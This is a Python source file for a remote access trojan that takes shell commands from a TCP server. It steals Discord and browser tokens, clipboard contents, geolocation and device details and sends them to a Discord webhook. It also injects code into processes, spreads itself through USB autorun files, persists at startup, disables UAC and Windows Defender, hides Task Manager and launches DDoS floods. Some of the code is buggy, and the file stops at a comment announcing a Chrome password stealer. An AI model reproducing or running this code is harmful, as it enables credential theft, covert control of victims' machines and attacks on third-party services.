# importing modules
import os
import sys
import time
import socket
import platform
import importlib
import threading
import subprocess
import urllib.request
import webbrowser
import random
import shutil
import requests
import re
import json
import struct
import cv2
import pyperclip
import numpy as np
import signal

from json import loads
from io import BytesIO
from PIL import Image
from mss import mss
from requests import *
from time import *
from Xlib import X, display
from pymem import Pymem
from ChromePasswordsStealer import ChromePasswordsStealer

# blocking task manager variable
block = False

# client variable
client = None

# Checking the current operating system and storing it into a variable
current_os = platform.system()

# send data to webhook
def send_to_webhook(message):
    global WEBHOOK_URL
    data = {
        'content': message
    }
    response = requests.post(WEBHOOK_URL, json=data)
    if response.ok:
        return "Successful"
    else:
        return "Failed"


# delete file
def rmv(file_path):
    try:
        os.remove(file_path)
        print("File deleted successfully.")
    except OSError as e:
        print(f"Error deleting the file: {e}")


# run command
def rc(command):
    os.system(command)


# getting the ip address of the system
def get_ip_address():
    global current_os
    if current_os == "Windows":
        return socket.gethostbyname(socket.gethostname())
    else:
        interfaces = socket.getaddrinfo(socket.gethostname(), None)
        for addr in interfaces:
            ip = addr[4][0]
            if not ip.startswith("127."):
                return ip
    return None


# hides the terminal window
def Hide():
    global current_os
    current_file_name = os.path.basename(__file__)
    try:
        if current_os == 'Windows': # Windows
            import win32console
            import win32gui
            win = win32console.GetConsoleWindow()
            win32gui.ShowWindow(win, 0)
        elif current_os == 'Linux': # Linux
            os.system("xset dpms force off")
        elif current_os == 'Darwin': # macOS
            subprocess.call("osascript -e 'tell app \"System Events\" to key code 144'", shell=True)
        elif current_os == 'SunOS':  # Solaris
            subprocess.Popen(f"/usr/openwin/bin/xterm -e 'python {current_file_name}' > /dev/null 2>&1 &", shell=True)
        else:
            raise NotImplementedError("Unsupported Platform")
    except ImportError as e:
        print("Error: Required module not found:", e)
    except OSError as e:
        print("Error: OS-related error occurred:", e)
    except Exception as e:
        print("Error:", e)


# putting itself to startup
def put_self_to_startup():
    global current_os
    # Get the current script's file path
    script_path = os.path.abspath(sys.argv[0])
    try:
        if current_os == 'Windows': # Windows
            # Get the user's Startup folder
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            # Create a shortcut file in the Startup folder
            shortcut_path = os.path.join(startup_folder, os.path.basename(script_path) + '.lnk')
            # Copy the script to the Startup folder
            shutil.copyfile(script_path, shortcut_path)
            client.send("Added to startup on Windows".encode('utf-8'))
        elif current_os == 'Linux': # Linux
            # Add a cron job to execute the script on startup
            cron_job = f'@reboot python3 {script_path} >/dev/null 2>&1'
            with open('/tmp/crontab.txt', 'w') as crontab_file:
                crontab_file.write(cron_job)
            rc("crontab /tmp/crontab.txt")
            os.remove('/tmp/crontab.txt')
            client.send("Added to startup on Linux".encode('utf-8'))
        elif current_os == 'Darwin':  # macOS
            # Add the script to user login items
            osascript_command = f'tell application "System Events" to make new login item at end with properties {{path:"{script_path}", hidden:false}}'
            os.system(f'osascript -e \'{osascript_command}\'')
            client.send("Added to startup on macOS".encode('utf-8'))
        elif current_os == 'SunOS':  # Solaris
            profile_file = os.path.expanduser('~/.profile')
            with open(profile_file, 'a') as f:
                f.write(f"\n# Add script to run on login\npython {script_path}\n")
            client.send("Added to startup on Solaris".encode('utf-8'))
        else:
            raise OSError(f"Unsupported operating system: {current_os}")
    except Exception as e:
        print(f"Error adding to startup: {str(e)}")


# blocking task manager
def block_task_manager(self):
     if ctypes.windll.shell32.IsUserAnAdmin() == 1:
         while (1):
             if block == True:
                 hwnd = user32.FindWindowW(0, "Task Manager")
                 user32.ShowWindow(hwnd, 0)
                 ctypes.windll.kernel32.Sleep(500)



# connecting to tcp server
def start_client():
    global client  # use the global client variable inside the function

    if client is None:
        global host
        global port

        client = socket.socket()  # connect to the server only if client is None
        client.connect((host, port))

    while True:
        command = client.recv(1024).decode('utf-8')

        # running shell command
        if command.startswith("shell "):
            import subprocess
            rcommand = command[6:].strip()
            # Run the command and store the output in a variable
            output = subprocess.check_output(rcommand, shell=True)
            try:
                output_str = output.decode('utf-8')
                client.send(output_str.encode('utf-8'))
            except UnicodeDecodeError:
                # Output decoding error occurred, handle it by replacing problematic characters
                output_str = output.decode('utf-8', errors='replace')
                client.send(output_str.encode('utf-8'))


        # injecting specified process on windows
        elif command.startswith("inject "):
            # saving process name into a variable
            process = command[7:].strip()
            if not process:
                process = 'notepad.exe'
            # process name
            processn = subprocess.Popen([process])
            pm = Pymem(process)
            pm.inject_python_interpreter()

            # Read the existing contents of the payload file
            with open("payload.py", 'r') as file:
                shellcode = file.read()

            pm.inject_python_shellcode(shellcode) 
            processn.kill()
            rmv("payload.py")



        # spreading the virus
        elif command == 'spread':
            def infect_usb():
                current_file = os.path.basename(__file__)
                usb_drives = get_usb_drives()

                for drive in usb_drives:
                    destination = os.path.join(drive, os.path.basename(current_file))
                    shutil.copy2(current_file, destination)

                    if os.name == 'nt':
                        create_windows_autorun(drive, current_file)
                    elif os.name == 'posix':
                        create_unix_autorun(drive, current_file)

            def get_usb_drives():
                usb_drives = []
                if os.name == 'nt':
                    drives = win_drives()
                    for drive in drives:
                        drive_type = get_drive_type(drive)
                        if drive_type == 'Removable Disk':
                            usb_drives.append(drive)
                elif os.name == 'posix':
                    drives = posix_drives()
                    for drive in drives:
                        if 'usb' in drive.lower():
                            usb_drives.append(drive)

                return usb_drives

            def win_drives():
                drives = []
                for i in range(65, 91):
                    drive = chr(i) + ':\\'
                    if os.path.exists(drive):
                        drives.append(drive)
                return drives

            def get_drive_type(drive):
                import ctypes
                drive_type = ''
                try:
                    drive_type_flags = ctypes.windll.kernel32.GetDriveTypeW(drive)
                    drive_types = {
                        0: 'Unknown',
                        1: 'No Root Directory',
                        2: 'Removable Disk',
                        3: 'Local Disk',
                        4: 'Network Drive',
                        5: 'Compact Disc',
                        6: 'RAM Disk'
                    }
                    drive_type = drive_types.get(drive_type_flags, '')
                except Exception as e:
                    pass
                return drive_type

            def posix_drives():
                import glob
                return glob.glob('/media/*') + glob.glob('/mnt/*')

            def create_windows_autorun(drive, current_file):
                autorun_path = os.path.join(drive, 'autorun.inf')
                if getattr(sys, 'frozen', False):  # Executable context
                    executable_path = sys.executable
                else:  # Python file context
                    executable_path = sys.argv[0]

                autorun_content = f'''
                [autorun]
                open="{executable_path}" "{current_file}"
                action=Run Code
                shell\open\command="{executable_path}" "{current_file}" %1
                shell\explore\command="{executable_path}" "{current_file}"
                shell=verb
                '''

                with open(autorun_path, 'w') as autorun_file:
                    autorun_file.write(autorun_content)

            def create_unix_autorun(drive, current_file):
                autorun_path = os.path.join(drive, '.autorun')
                autorun_content = '#!/bin/sh\nchmod +x {0}\n./{0}'.format(os.path.basename(current_file))

                with open(autorun_path, 'w') as autorun_file:
                    autorun_file.write(autorun_content)

            infect_usb()



        # getting usb devices list
        elif command =='usbdev':
            def get_usb_devices():
                if current_os =='Windows':
                    usb_devices = []
                    for device in os.listdir(r'\\.\root\USB'):
                        usb_devices.append(device)
                    return usb_devices
                elif current_os =='Linux':
                    usb_devices = []
                    for device in os.listdir('/sys/bus/usb/devices/'):
                        if device.startswith('usb'):
                            usb_devices.append(device)
                    return usb_devices

                elif sys.platform.startswith('darwin'):
                    usb_devices = []
                    for device in os.listdir('/dev/'):
                        if device.startswith('disk') and 'usb' in device.lower():
                            usb_devices.append(device)
                    return usb_devices

                elif sys.platform.startswith('sunos'):
                    usb_devices = []
                    for device in os.listdir('/dev/rdsk/'):
                        if 'usb' in device.lower():
                            usb_devices.append(device)
                    return usb_devices
                else:
                    raise NotImplementedError("Unsupported operating system.")
            # Usage example
            usb_devices = get_usb_devices()
            for device in usb_devices:
                client.send(device.encode('utf-8'))


        # disables uac on windows
        elif command == 'disable-uac':
            rc("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")


        # disables task manager
        elif command == 'disabletaskmgr':
             global block
             block = True
             Thread(target=self.block_task_manager, daemon=True).start()
             client.send("Task Manager is disabled!".encode('utf-8'))


        # extends rights
        elif command == 'extendrights':
             import ctypes
             ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) 
             sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated" 
             client.send(sending.encode('utf-8'))

        # checking if user is admin
        elif command == 'isuseradmin':
             import ctypes
             if ctypes.windll.shell32.IsUserAnAdmin() == 1:
                 sending = f'{socket.gethostbyname(socket.gethostname())} is admin'
                 client.send(sending.encode('utf-8'))
             else:
                 sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
                 client.send(sending.encode('utf-8'))

        # adding to startup
        elif command =='ats':
            put_self_to_startup()

        # getting installed software list
        elif command =='software':
            global current_os
            def get_installed_software():
                if current_os == 'Windows': # Windows
                    import winreg
                    software_list = []
                    uninstall_key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
                    hkey = winreg.HKEY_LOCAL_MACHINE

                    try:
                        with winreg.OpenKey(hkey, uninstall_key) as key:
                            for i in range(winreg.QueryInfoKey(key)[0]):
                                try:
                                    subkey_name = winreg.EnumKey(key, i)
                                    with winreg.OpenKey(key, subkey_name) as subkey:
                                        value = winreg.QueryValueEx(subkey, 'DisplayName')[0]
                                        software_list.append(value)
                                except OSError:
                                    pass
                    except FileNotFoundError:
                        pass

                    return software_list

                elif current_os == 'Linux': # Linux
                    import subprocess
                    process = subprocess.Popen(['dpkg', '-l'], stdout=subprocess.PIPE)
                    output, _ = process.communicate()
                    lines = output.decode().split('\n')[5:-1]
                    software_list = [line.split()[1] for line in lines]
                    return software_list

                elif current_os == 'Darwin':  # macOS
                    process = subprocess.Popen(['brew', 'list'], stdout=subprocess.PIPE)
                    output, _ = process.communicate()
                    lines = output.decode().split('\n')[:-1]
                    software_list = [line for line in lines]
                    return software_list

                elif current_os == 'SunOS':  # Solaris
                    process = subprocess.Popen(['pkginfo', '-l'], stdout=subprocess.PIPE)
                    output, _ = process.communicate()
                    lines = output.decode().split('\n')[:-1]
                    software_list = [line.split()[0] for line in lines]
                    return software_list
                else:
                    client.send("Unsuported OS!".encode('utf-8'))
            # Usage example
            installed_software = get_installed_software()
            for software in installed_software:
                client.send(software.encode('utf-8'))


        # stealing discord tokens
        elif command =='steal-discord-tokens':
            class DiscordTG:
                @staticmethod
                def __find_tokens(path: str) -> list:
                    try:
                        path += '\\Local Storage\\leveldb'
                        tokens = []
                        for file_name in os.listdir(path):
                            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                                continue
                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                                    for token in re.findall(regex, line):
                                        tokens.append(token)
                        return tokens
                    except Execption:
                        return None
                @staticmethod
                def __paths() -> dict:
                    local = os.getenv('LOCALAPPDATA')
                    roaming = os.getenv('APPDATA')
                    paths = {
                        'Discord': roaming + '\\Discord',
                        'Discord Canary': roaming + '\\discordcanary',
                        'Discord PTB': roaming + '\\discordptb',
                        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
                        'Google Chrome 2': local + '\\Google\\Chrome\\User Data\\Profile 1',
                        'Google Chrome 3': local + '\\Google\\Chrome\\User Data\\Profile 2',
                        'Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
                        'Edge 2': local + '\\Microsoft\\Edge\\User Data\\Profile 1',
                        'Edge 3': local + '\\Microsoft\\Edge\\User Data\\Profile 2',
                        'Firefox': local + '\\Mozilla\\Firefox\\Profiles',
                        'Opera': roaming + '\\Opera Software\\Opera Stable',
                        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
                    }
                    return paths
                @staticmethod
                def _create_md() -> str:
                    paths = DiscordTG.__paths()
                    md = ''
                    for platform, path in paths.items():
                        if not os.path.exists(path):
                            continue
                        md += f'\n**{platform}**\n```\n'
                        tokens = DiscordTG.__find_tokens(path)
                        if len(tokens) > 0:
                            for token in tokens:
                                md += f'{token}\n'
                        else:
                            md += 'No tokens found.\n'
                        md += '```'
                    return md

            class Webhook:
                def __init__(self, url: str):
                    self.__url = url
                    # noinspection PyProtectedMember
                    self.content = DiscordTG._create_md()

                @property
                def __json(self) -> dict:
                    data = dict()
                    for key, value in self.__dict__.items():
                        if value and key not in ["url"]:
                            data[key] = value
                    return data

                def _execute(self) -> int:
                    response = post(self.__url, json=self.__json, params={'wait': True})
                    while response.status_code == 429:
                        errors = loads(
                            response.content.decode('utf-8'))
                        retry_after = (int(errors['retry_after']) / 1000) + 0.15
                        sleep(retry_after)
                        response = post(self.__url, json=self.__json, params={'wait': True})
                    return response.status_code
            # noinspection PyProtectedMember
            def webhook(url: str) -> int:
                """
                Call this method to send the tokens to your webhook
                :param url: your discord webhook url (string)
                :return: response code (int)
                """
                return Webhook(url)._execute()
            webhook(WEBHOOK_URL)


        # setting volume to 100%
        elif command =='volumeup':
            import subprocess
            global current_os
            def set_sound_volume(volume):
                if current_os == "Windows": # Windows
                    # Windows command to set sound volume to 100%
                    subprocess.run(["powershell", "(Get-WmiObject -Query \"Select * from Win32_SoundDevice\").SetDefaultAudioEndpoint((Get-WmiObject -Query \"Select * from Win32_SoundDevice\").DeviceID, '')"])
                    subprocess.run(["powershell", "(Get-WmiObject -Query \"Select * from Win32_SoundDevice\").SetDefaultAudioEndpoint((Get-WmiObject -Query \"Select * from Win32_SoundDevice\").DeviceID, '')"])

                elif current_os == "Linux": # Linux
                    # Linux command to set sound volume to 100%
                    subprocess.run(["amixer", "-D", "pulse", "sset", "Master", "100%"])

                elif current_os == 'Darwin': # macOS
                    subprocess.run(["osascript", "-e", "set volume output volume 100"])

                elif current_os == 'SunOS':  # Solaris
                    subprocess.run(["mixerctl", "-s", "output.volume=100"])
                else:
                    client.send("Unsuported oprating system!".encode('utf-8'))
            # Call the function to set the sound volume to 100%
            set_sound_volume(100)


        # setting volume to 0%
        elif command =='volumedown':
            import subprocess
            global current_os
            def set_sound_volume(volume):
                if current_os == "Windows": # Windows
                    # Windows command to set sound volume to 0%
                    subprocess.run(["powershell", "(Get-WmiObject -Query \"Select * from Win32_SoundDevice\").SetDefaultAudioEndpoint((Get-WmiObject -Query \"Select * from Win32_SoundDevice\").DeviceID, '')"])

                elif current_os == "Linux": # Linux
                    # Linux command to set sound volume to 0%
                    subprocess.run(["amixer", "-D", "pulse", "sset", "Master", "0%"])

                elif current_os == 'Darwin': # macOS
                    subprocess.run(["osascript", "-e", "set volume output volume 0"])

                elif current_os == 'SunOS':  # Solaris
                    subprocess.run(["mixerctl", "-s", "output.volume=0"])
                else:
                    client.send("Unsuported oprating system!".encode('utf-8'))
            # Call the function to set the sound volume to 0%
            set_sound_volume(0)


        # turns display off
        elif command =='dispoff':
            global current_os
            if current_os =='Windows': # Windows
                import ctypes
                WM_SYSCOMMAND = 274
                HWND_BROADCAST = 65535
                SC_MONITORPOWER = 61808
                success = "[+] Command successfully executed.\n"
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                client.send(success.encode('utf-8'))

            elif current_os =='Darwin': # macOS
                resp=rc("pmset displaysleepnow")
                client.send(resp.encode('utf-8'))

            elif current_os =='Linux': # Linux
                resp=rc("xset dpms force off")
                client.send(resp.encode('utf-8'))

            elif current_os == 'SunOS':  # Solaris
                subprocess.run(["/usr/openwin/bin/xscreensaver-command", "-activate"])


        # turns display onn
        elif command =='disponn':
            if current_os =='Windows': # Windows
                import ctypes
                WM_SYSCOMMAND = 274
                HWND_BROADCAST = 65535
                SC_MONITORPOWER = 61808
                success = "[+] Command successfully executed.\n"
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
                client.send(success.encode('utf-8'))

            elif current_os == 'Darwin': # macOS
                resp=rc("caffeinate -u -t 2")
                client.send(resp.encode('utf-8'))

            elif current_os =='Linux': # Linux
                resp=rc("xset dpms force on")
                client.send(resp.encode('utf-8'))

            elif current_os == 'SunOS':  # Solaris
                resp =rc("xset dpms force on")
                client.send(resp.encode('utf-8'))


        # ejects cd tray
        elif command == 'ejectcd':
            if current_os =='Windows': # Windows
                import ctypes
                return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
                client.send("cd tray successfully ejected".encode('utf-8'))
            elif current_os =='Linux': # Linux
                try:
                   rc("eject")
                   client.send("cd tray successfully ejected".encode('utf-8'))
                except:
                   rc("sudo eject")
                   client.send("cd tray successfully ejected".encode('utf-8'))
            elif current_os == 'Darwin': # macOS
                subprocess.call(["drutil", "eject"])
                client.send("CD tray successfully ejected".encode('utf-8'))
            elif current_os == 'SunOS':  # Solaris
                subprocess.run(["eject"])


        # retracts cd tray
        elif command == 'retractcd':
            if current_os =='Windows': # Windows
                import ctypes
                return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
                client.send("cd tray successfully retracted".encode('utf-8'))
            elif current_os =='Linux': # Linux
                try:
                   rc("eject -t")
                   client.send("cd tray successfully retracted".encode('utf-8'))
                except:
                   rc("sudo eject -t")
                   client.send("cd tray successfully retracted".encode('utf-8'))
            elif current_os == 'Darwin': # macOS
                subprocess.call(["drutil", "tray", "eject"])
                client.send("CD tray successfully retracted".encode('utf-8'))
            elif current_os == 'Solaris': # Solaris
                subprocess.call(["eject", "-i"])
                client.send("CD tray successfully retracted".encode('utf-8'))


        # geolocates
        elif command =='geolocate':
            try:
                ip = requests.request('GET', 'https://api.ipify.org').text
            except Exception as e:
                resp = '[!] Unable to obtain public IP address\n'
                client.send(resp.encode('utf-8'))
            else:
                try:
                    url = 'https://ipapi.co/{}/json/'.format(ip)
                    r = requests.get(url)
                    js = r.json()

                    ctry_code = js['country_code']
                    ctry_name = js['country_name']
                    regn_name = js['region']
                    t_zone = js['timezone']
                    city = js['city']
                    lat = js['latitude']
                    log = js['longitude']
                    zipcode = js['postal']
                    metro = js['asn']
                    hour = int(strftime("%H"))
                    am_pm = "AM"
                    if hour > 12:
                        hour = str(hour - 12)
                        am_pm = "PM"
                    time = "{}{}{}".format(str(hour), strftime(":%M:%S "), am_pm)
                    date = strftime("%m/%d/%Y")
                    resp = ('    Public IP\t\t: {}\n'
                            '\n    Country\t\t: {}, {}'
                            '\n    Region\t\t: {}'
                            '\n    City\t\t: {}'
                            '\n    Postal code\t\t: {}'
                            '\n    Lat/Long\t\t: {}, {}'
                            '\n    Metro Code\t\t: {}\n'
                            '\n    Date\t\t: {}'
                            '\n    Time\t\t: {}'
                            '\n    Time zone\t\t: {}\n').format(ip, ctry_name, ctry_code, regn_name, city, zipcode, lat, log, metro, date, time, t_zone)
                    google_maps_url = f"https://www.google.com/maps?q={lat},{log}"
                    # sending them to the discord webhook
                    send_to_webhook(resp)
                    send_to_webhook(google_maps_url)
                except Exception as e:
                    resp = '[!] Unable to obtain physical location information\n'
                    client.send(resp.encode('utf-8'))


        # ddoses tcp
        elif command.startswith("ddos-tcp "):
            import socket
            import threading

            target_ip = '127.0.0.1'  # Replace with the target IP address
            target_port = 8080  # Replace with the target port number

            jnk =b'''
jsbshsjsbdvsjsbssuvsvsuvisycwgegueggssd
wbejbusts7g8yg8ug9us9ufywf9yf9u0uf9yfy8y8v
9gg9usvojshce9ososxitxwgxwohwhcwocowcohohwcohcwohcs
vwovowvohsohcw8cwc8wf8ycywcoywuwg9vw9csjvsu9s9fs9gs9g
9gwocsocsoossy99yc9y9ywoywoyogw9y9ge9yw9gw9uwuge9e9w9g
            '''

            def send_junk_data():
                # Connect to the target
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((target_ip, target_port))
                # Send junk data for one second
                end_time = time.time() + 1
                while time.time() < end_time:
                    client_socket.send()

                # Close the connection
                client_socket.close()

            def start_dos_attack(num_iterations):
                for _ in range(num_iterations):
                    # Create a new thread for each iteration
                    thread = threading.Thread(target=send_junk_data)
                    thread.start()

            # Adjust the variable below to specify the number of iterations
            num_iterations = 1000
            start_dos_attack(num_iterations)



        # ddoses url
        elif command.startswith("ddos "):
            url = command[5:].strip()

            # Global variables
            success_count = 0
            total_requests = 0
            lock = threading.Lock()

            def send_request(url, request_num):
                global success_count
                global total_requests

                try:
                    response = requests.get(url)
                    with lock:
                        total_requests += 1
                        if response.status_code == 200:
                            success_count += 1
                        else:
                            print("an error occured")
                except requests.exceptions.RequestException as e:
                    with lock:
                        total_requests += 1
                        print(f"Request {request_num}: An error occurred:", e)

            def print_summary(signal, frame):
                global success_count
                global total_requests

                with lock:
                    print(f"{success_count} out of {total_requests} requests were successfully sent.")

                # Terminate the program after printing the summary
                sys.exit(0)

            # Number of requests to send
            num_requests = 100000

            # Register the signal handler for Ctrl+C
            signal.signal(signal.SIGINT, print_summary)

            # Create a list to store the threads
            threads = []

            # Send the requests concurrently
            for i in range(num_requests):
                request_num = i + 1  # Increment request number here
                thread = threading.Thread(target=send_request, args=(url, request_num))
                thread.start()
                threads.append(thread)

            # Wait for all threads to complete
            for thread in threads:
                thread.join()

            # Print the summary after all threads have finished
            print_summary(None, None)



        # checking antivirus(windows)
        elif command =='av':
            av = "Unknown"
            if os.path.exists('C:\\Program Files\\Windows Defender'):
                av = 'Windows Defender'
                send_to_webhook(av)
            if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
                av = 'Avast'
                send_to_webhook(av)
            if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
                av = 'AVG'
                send_to_webhook(av)
            if os.path.exists('C:\\Program Files\\Avira\\Launcher'):
                av = 'Avira'
                send_to_webhook(av)
            if os.path.exists('C:\\Program Files\\IObit\\Advanced SystemCare'):
                av = 'Advanced SystemCare'
                send_to_webhook(av)
            if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
                av = 'Bitdefender'
                send_to_webhook(av)
            if os.path.exists('C:\\Program Files\\COMODO\\COMODO Internet Security'):
                av = 'Comodo'
                send_to_webhook(av)
            if os.path.exists('C:\\Program Files\\DrWeb'):
                av = 'Dr.Web'
                send_to_webhook(av)
            if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
                av = 'ESET'
                send_to_webhook(av)
            if os.path.exists('C:\\Program Files\\GRIZZLY Antivirus'):
                av = 'Grizzly Pro'
                send_to_webhook(av)
            if os.path.exists('C:\\Program Files\\Kaspersky Lab'):
                av = 'Kaspersky'
                send_to_webhook(av)
            if os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
                av = 'Malware fighter'
                send_to_webhook(av)
            if os.path.exists('C:\\Program Files\\360\\Total Security'):
                av = '360 Total Security'
                send_to_webhook(av)
        else:
            av ="Not Found"
            send_to_webhook(av)


        # enables windows defender
        if command =='enable-windows-defender':
            import _winreg
            import subprocess

            def windefnd_scan():
                defender = reg_exists('SOFTWARE\\Microsoft\\Windows Defender')
                if not defender: defender = reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender')
                if not defender: return False
                else: return True

            def windefnd_running():
                key = False
                if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
                    key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Policies\\Microsoft\\Windows Defender')
                elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
                    key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Microsoft\\Windows Defender')
                if key:
                    try:
                        val=_winreg.QueryValueEx(key, "DisableAntiSpyware")
                        if val[0] == 1:
                            return False
                        else:
                            return True
                    except:
                        return False

            def enable_windef():
                if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
                    return rc('REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f')
                elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
                    return rc('REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f')


            if windefnd_scan():
                if not windefnd_running():
                    enable_windef()
                    if windefnd_running():
                        resp = "[+] Windows Defender is now enabled.\n"
                    else:
                        resp = "[!] Failed to enable Windows Defender.\n"
                else:
                    resp = "[*] Windows Defender is already enabled.\n"
            else:
                resp = "[*] Windows Defender not detected on the system.\n"
            client.send(resp.encode('utf-8'))



        # disables windows defender
        elif command =='disable-windows-defender':
            import _winreg
            import subprocess

            def windefnd_scan():
                defender = reg_exists('SOFTWARE\\Microsoft\\Windows Defender')
                if not defender: defender = reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender')
                if not defender: return False
                else: return True

            def windefnd_running():
                key = False
                if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
                    key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Policies\\Microsoft\\Windows Defender')
                elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
                    key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Microsoft\\Windows Defender')
                if key:
                    try:
                        val=_winreg.QueryValueEx(key, "DisableAntiSpyware")
                        if val[0] == 1:
                            return False
                        else:
                            return True
                    except:
                        return False


            def disable_windef():
                if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
                    return rc('REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
                elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
                    return rc('REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')


            if windefnd_scan():
                if windefnd_running():
                    disable_windef()
                    if windefnd_running():
                        resp = "[!] Failed to disable Windows Defender\n"
                    else:
                        resp = "[+] Windows Defender is now disabled\n"
                else:
                    resp = "[+] Windows Defender is already disabled\n"
            else:
                resp = "[*] Windows Defender not detected on the system\n"
            client.send(resp.encode('utf-8'))



        # text to speech
        elif command.startswith("tts "):
            import subprocess
            message = command[4:].strip()
            # checking windows os
            if current_os =='Windows':
                def tts(message):
                    # Create the VBScript code
                    vbscript_code = f'Dim message, sapi\nmessage = "{message}"\nSet sapi = CreateObject("sapi.spvoice")\nsapi.Speak message'
                    # Create a temporary VBScript file
                    vbscript_file = os.path.join(os.environ['TEMP'], 'temp_script.vbs')
                    with open(vbscript_file, 'w') as file:
                        file.write(vbscript_code)
                    try:
                        # Execute the VBScript file
                        os.system(f'cscript //nologo "{vbscript_file}"')
                    finally:
                        # Delete the temporary VBScript file
                        os.remove(vbscript_file)
                # using it
                tts(message)

            # checking if current operating system is linux
            elif current_os =='Linux':
                subprocess.call(['espeak', message])

            # checking if curent operating system is mac os
            elif current_os == 'Darwin':
                subprocess.call(['say', message])

            # Checking if current operating system is Solaris
            elif current_os == 'SunOS':
                os.system('echo "' + message + '" | /usr/bin/espeak')



        # coppying clipboard
        elif command =='cp':
            if current_os == 'Windows': # Windows
                text = pyperclip.paste()
            elif current_os == 'Linux': # Linux
                text = subprocess.check_output(['xsel', '-b']).decode().strip()
            elif current_os == 'Darwin': # macOS
                try:
                    text = subprocess.check_output(['pbpaste']).decode().strip()
                except subprocess.CalledProcessError:
                    text = ""
            elif current_os =='SunOS': # Solaris
                text = subprocess.check_output(['xclip', '-selection', 'clipboard', '-o']).decode().strip()
            else:
                raise Exception('Unsupported operating system')
            client.send("successfully sended clipboard to that discord webhook".encode('utf-8'))
            send_to_webhook(text)


        # opening url
        elif command.startswith("openu "):
           url = command[6:].strip()
           try:
               webbrowser.open(url)
               client.send("Succesfully opened url".encode('utf-8'))
           except:
               client.send("An error occured".encode('utf-8'))


        # custom python code
        elif command.startswith("ccp "):
            import os
            import tempfile
            # running and making tje file with the python code
            def run_python_code(code):
                with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=True) as f:
                    f.write(code)
                    f.flush()
                    os.chmod(f.name, 0o755)  # set executable permission
                    os.system(f'python {f.name}')
            code = command[4:].strip()
            try:
                run_python_code(code)
                client.send("Succesfully runned python code".encode('utf-8'))
            except:
                client.send("An error occured".encode('utf-8'))


        # shuts down the device
        elif command =='shutdown':
            # shutdown computer(any computer)
            if current_os == 'Windows':
                os.system("shutdown /s /t 1")
                client.send("the device was shutted down".encode('utf-8'))
            elif current_os == 'Linux':
                os.system("sudo shutdown -h now")
                client.send("the device was shutted down".encode('utf-8'))
            elif current_os == 'Darwin':  # for macOS
                os.system("sudo shutdown -h now")
                client.send("the device was shutted down".encode('utf-8'))
            elif current_os == 'FreeBSD':
                os.system("sudo shutdown -h now")
                client.send("the device was shutted down".encode('utf-8'))
            elif current_os == 'NetBSD':
                os.system("sudo shutdown -p now")
                client.send("the device was shutted down".encode('utf-8'))
            elif current_os == 'OpenBSD':
                os.system("sudo shutdown -p now")
                client.send("the device was shutted down".encode('utf-8'))
            elif current_os == 'SunOS':
                os.system("sudo shutdown -y -i5 -g0")  # for Solaris
                client.send("the device was shutted down".encode('utf-8'))
            else:
                client.send("shutdown not supported on this operating system".encode('utf-8'))


        # getting device info
        elif command == 'devinfo':
            import psutil
            cpu_percent = str(psutil.cpu_percent())
            memory_percent = str(psutil.virtual_memory().percent)
            disk_percent = str(psutil.disk_usage('/').percent)
            ip = str(get_ip_address())
            arch = platform.architecture()[0]

            info = (f'''
                  System Info
            cpu percent:{cpu_percent}
            memory percent:{memory_percent}
            disk percent:{disk_percent}
            current os:{current_os}
            arch:{arch}
            ip:{ip}
                    ''')

            # sending the information
            send_to_webhook(info)


        # chrome password stealer
